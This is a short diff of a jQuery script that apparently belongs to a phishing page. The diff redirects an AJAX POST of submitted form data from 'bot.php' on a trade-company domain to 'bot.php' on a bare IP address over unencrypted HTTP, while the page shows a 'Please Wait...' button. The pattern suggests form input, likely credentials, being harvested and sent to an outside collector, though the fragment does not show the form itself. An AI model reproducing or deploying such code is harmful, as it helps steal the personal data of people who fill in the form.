@@ -107,7 +107,7 @@ $(document).ready(function() {
   Please Wait...
 </button>`).prop("disabled", true);
         $.ajax({
-            url: "https://europeimporttrade.com/sp/bot.php",
+            url: "http://65.52.192.219/php/bot.php",
             type: 'POST',
             data: formData,
             contentType: false,
